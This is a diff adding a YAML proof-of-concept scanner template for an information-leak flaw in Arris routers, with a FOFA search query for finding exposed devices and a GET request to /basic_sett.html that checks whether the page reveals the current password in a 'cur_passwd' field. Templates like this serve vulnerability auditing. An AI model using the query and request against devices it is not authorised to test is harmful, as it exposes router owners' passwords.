@@ -1,0 +1,20 @@
+id: poc-yaml-arris-router-basic-sett-info-leak
+info:
+  name: Arris 路由器 basic_sett 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: arris
+  fofa: body="base64encode(document.tF.pws.value)" || body="ARRIS TR3300"
+requests:
+- method: GET
+  path: /basic_sett.html
+  expression: 'status_code == 200 &&
+
+    contains(body,"cur_passwd") &&
+
+    matches(body,`name="cur_passwd" value=".*">`)
+
+    '
+variables: {}
+transport: http
